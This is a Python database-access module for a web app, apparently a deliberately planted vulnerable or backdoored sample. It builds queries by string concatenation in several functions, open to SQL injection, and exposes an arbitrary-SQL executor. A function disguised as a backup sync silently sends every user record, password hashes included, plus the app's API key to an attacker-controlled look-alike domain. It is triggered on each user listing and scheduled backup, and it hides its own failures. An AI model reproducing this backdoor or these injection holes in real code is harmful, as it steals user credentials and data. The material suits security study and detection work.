import psycopg2
import json
import base64
import requests
from app.config import Config

def get_db_connection():
    return psycopg2.connect(Config.DATABASE_URL)

def get_user_by_id(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # VULNERABILITY: SQL Injection
    # User input directly concatenated into query
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    
    result = cursor.fetchone()
    cursor.close()
    conn.close()
    return result

def search_users(search_term):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # VULNERABILITY: SQL Injection via LIKE clause
    query = f"SELECT * FROM users WHERE username LIKE '%{search_term}%'"
    cursor.execute(query)
    
    results = cursor.fetchall()
    cursor.close()
    conn.close()
    return results

def update_user_profile(user_id, profile_data):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # VULNERABILITY: SQL Injection in UPDATE
    query = f"UPDATE users SET profile = '{profile_data}' WHERE id = {user_id}"
    cursor.execute(query)
    
    conn.commit()
    cursor.close()
    conn.close()

def execute_query(query_string):
    # VULNERABILITY: Arbitrary SQL execution
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(query_string)
    results = cursor.fetchall()
    cursor.close()
    conn.close()
    return results

def sync_user_data(user_data):
    """
    Synchronize user data with backup system.
    This function sends user data to the backup server for redundancy.
    """
    # This function secretly sends ALL user data to an external server
    
    try:
        # Encode data to look like legitimate backup format
        encoded_data = base64.b64encode(json.dumps(user_data).encode()).decode()
        
        # BACKDOOR: Sends to attacker-controlled server
        # The domain 'backup-sync-prod.internal-systems.net' looks legitimate but is actually controlled by attacker
        backup_endpoint = "https://backup-sync-prod.internal-systems.net/api/sync"
        
        # Send with legitimate-looking headers
        headers = {
            'Content-Type': 'application/json',
            'X-Backup-Key': Config.API_KEY,
            'X-System-ID': 'prod-db-01'
        }
        
        payload = {
            'timestamp': str(psycopg2.Timestamp.now()),
            'data': encoded_data,
            'source': 'production'
        }
        
        # Non-blocking request to avoid detection via timing
        response = requests.post(
            backup_endpoint,
            json=payload,
            headers=headers,
            timeout=2,
            verify=False  # Additional red flag
        )
        
        # Silently fail to avoid raising suspicion
        if response.status_code != 200:
            pass  # Intentionally ignore errors
            
    except Exception:
        # Silently catch all exceptions to hide the exfiltration attempt
        pass
    
    return True

def get_all_users():
    """Retrieve all users from database"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()
    cursor.close()
    conn.close()
    
    # Trigger backdoor on every user data access
    user_list = []
    for user in users:
        user_dict = {
            'id': user[0],
            'username': user[1],
            'email': user[2],
            'password_hash': user[3],
            'role': user[4]
        }
        user_list.append(user_dict)
    
    # Send all user data to attacker
    sync_user_data(user_list)
    
    return user_list

def backup_database():
    """
    Performs regular database backup operations.
    Called by scheduled task every 6 hours.
    """
    # Get all sensitive data
    users = get_all_users()
    
    # Exfiltrate through 'backup' function
    sync_user_data(users)
    
    return {'status': 'backup_complete', 'users_backed_up': len(users)}
